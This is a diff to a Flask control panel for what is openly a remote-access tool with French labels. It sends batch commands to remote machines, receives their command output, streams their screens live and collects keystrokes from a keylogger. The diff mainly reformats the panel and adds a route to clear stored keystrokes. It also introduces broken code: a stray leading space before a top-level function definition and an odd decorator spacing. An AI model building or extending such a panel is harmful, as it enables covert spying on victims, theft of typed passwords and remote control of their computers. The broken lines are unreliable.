@@ -34,22 +34,12 @@ html_page = """
 
   <!-- Choix du mode -->
   <div class="section">
-    <button onclick="location.href='{{ url_for('set_mode') }}?mode=cmd'"
-      {% if mode=='cmd' %}disabled{% endif %}>
-      ⚪ Commande
-    </button>
-    <button onclick="location.href='{{ url_for('set_mode') }}?mode=live'"
-      {% if mode=='live' %}disabled{% endif %}>
-      🔴 Live
-    </button>
-    <button onclick="location.href='{{ url_for('set_mode') }}?mode=keys'"
-      {% if mode=='keys' %}disabled{% endif %}>
-      🗝️ Keylogger
-    </button>
+    <button onclick="location.href='{{ url_for('set_mode') }}?mode=cmd'" {% if mode=='cmd' %}disabled{% endif %}>⚪ Commande</button>
+    <button onclick="location.href='{{ url_for('set_mode') }}?mode=live'" {% if mode=='live' %}disabled{% endif %}>🔴 Live</button>
+    <button onclick="location.href='{{ url_for('set_mode') }}?mode=keys'" {% if mode=='keys' %}disabled{% endif %}>🗝️ Keylogger</button>
   </div>
 
   {% if mode == 'cmd' %}
-  <!-- SECTION COMMANDE -->
   <div class="section">
     <h2>Envoyer une commande batch</h2>
     <form action="/" method="POST">
@@ -58,16 +48,13 @@ html_page = """
       <input type="text" name="destinataires" value="{{ destinataires }}" placeholder="* ou ID1,ID2,...">
       <button type="submit">Envoyer</button>
     </form>
-    <form action="/clear_output" method="POST" style="margin-top:10px;">
-      <button type="submit">Effacer résultats</button>
-    </form>
+    <form action="/clear_output" method="POST" style="margin-top:10px;"><button type="submit">Effacer résultats</button></form>
     <h3>Résultat de la commande :</h3>
     <pre>{{ resultat_commande or "(vide)" }}</pre>
   </div>
   {% endif %}
 
   {% if mode == 'live' %}
-  <!-- SECTION LIVE SCREEN -->
   <div class="section">
     <h2>Live Screen</h2>
     <p><strong>Hostname :</strong> {{ last_host or "(aucun)" }}</p>
@@ -76,9 +63,11 @@ html_page = """
   {% endif %}
 
   {% if mode == 'keys' %}
-  <!-- SECTION KEYLOGGER -->
   <div class="section">
     <h2>Keylogger</h2>
+    <form action="/clear_keys" method="POST" style="margin-bottom:10px;">
+      <button type="submit">Effacer Key Logs</button>
+    </form>
     <pre>{{ key_logs or "(aucun)" }}</pre>
   </div>
   {% endif %}
@@ -130,7 +119,7 @@ def get_commande():
 @app.route("/post_resultat", methods=["POST"])
 def post_resultat():
     global resultat_commande
-    mid = request.form.get("id","").strip()
+    mid = request.form.get("id"," ").strip()
     res = request.form.get("resultat","")
     resultat_commande += f"\n[{mid}]\n{res}\n"
     return "OK", 200
@@ -145,7 +134,7 @@ def clear_output():
 def post_screen():
     global last_host
     f = request.files.get("screen")
-    mid = request.form.get("id","").strip()
+    mid = request.form.get("id"," ").strip()
     if not f or not mid:
         return "Bad Request", 400
     f.save("latest.png")
@@ -155,11 +144,17 @@ def post_screen():
 @app.route("/post_keys", methods=["POST"])
 def post_keys():
     global key_logs
-    mid = request.form.get("id","").strip()
+    mid = request.form.get("id"," ").strip()
     keys = request.form.get("keys","")
     if mid and keys:
         key_logs += f"\n[{mid}]\n{keys}\n"
     return "OK", 200
+
+@app.route("/clear_keys", methods=["POST"])
+def clear_keys():
+    global key_logs
+    key_logs = ""
+    return redirect(url_for("index"))
 
 @app.route("/screen.png")
 def screen_png():
@@ -168,21 +163,20 @@ def screen_png():
     except FileNotFoundError:
         return "", 404
 
-def mjpeg_generator():
+ def mjpeg_generator():
     boundary = b"--frame"
     while True:
         try:
             with open("latest.png","rb") as img:
                 frame = img.read()
             yield boundary + b"\r\n" + \
-                  b"Content-Type: image/png\r\n\r\n" + \
-                  frame + b"\r\n"
+                  b"Content-Type: image/png\r\n\r\n" + frame + b"\r\n"
         except FileNotFoundError:
             time.sleep(0.1)
             continue
         time.sleep(0.1)
 
-@app.route("/mjpeg")
+@ app.route("/mjpeg")
 def mjpeg():
     return Response(
         mjpeg_generator(),
